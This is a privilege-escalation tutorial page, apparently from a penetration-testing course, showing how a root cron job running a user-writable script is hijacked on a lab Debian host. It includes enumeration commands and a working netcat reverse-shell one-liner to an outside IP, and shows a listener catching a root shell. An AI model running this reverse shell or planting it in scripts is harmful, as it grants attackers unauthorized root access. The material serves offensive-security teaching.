---
description: Example of how to turn an insecure Cron job into privilege escalation
---

# Abusing Cron Jobs

In order to leverage insecure file permissions, one must locate an executable file that not only allows them write access, but also runs at an elevated privilege level.

On a Linux system, the `cron` time-based job scheduler is a prime target, since system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.

## Finding Insecure Jobs

Earlier sections explained how to [enumerate cron jobs](../enumeration/manual-enumeration.md#scheduled-tasks) and [search for directories with insecure write permissions](../enumeration/manual-enumeration.md#insecure-folder-permissions).

In this example, entries pertaining to a `root` `cron` job are found in the `syslog` file:

```shell-session
joe@debian-privesc:~$ grep -i "cron" /var/log/syslog
Oct 25 18:34:22 debian-privesc CRON[1177]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Oct 25 18:35:01 debian-privesc CRON[1212]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Oct 25 18:36:01 debian-privesc CRON[1336]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Oct 25 18:37:01 debian-privesc CRON[1456]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Oct 25 18:38:01 debian-privesc CRON[1557]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Oct 25 18:39:01 debian-privesc CRON[1682]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Oct 25 18:39:39 debian-privesc crontab[1793]: (root) LIST (root)
Oct 25 18:40:01 debian-privesc CRON[1827]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Oct 25 18:41:01 debian-privesc CRON[1956]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

According to the logs, a script in the `/home/joe/.scripts` directory is being executed every minute as `root`. Additionally, after searching for insecure folder permissions, it turns out the `.scripts` directory is writable for the current user:

```shell-session
joe@debian-privesc:~$ find / -writable -type d 2>/dev/null | grep /home/joe/.scripts
/home/joe/.scripts
```

That means the `user_backups.sh`  could be overwritten with a script of the attacker's choice. In the investigation for installed applications one would have found `netcat`:

```shell-session
joe@debian-privesc:~$ dpkg -l | grep netcat
ii  netcat-traditional                    1.10-41.1                                    amd64        TCP/IP swiss army knife
```

Now all conditions for escalation via `cron` have been satisfied. There is a job running as `root`, and it is executing a script that is in a attacker-writable location.

The attacker must simply open the `user_backups.sh` script and add the following line somewhere inside:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.201 8080 >/tmp/f
```

Once written, the attacker simply must wait a minute at most until the cron job executes again, at which point the shell will be executed and a listener can catch it:

```shell-session
kali@kali:~$ rlwrap nc -lnvp 8080
listening on [any] 8080 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.50.214] 57698
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

Per the output, privileges have been successfully escalated.
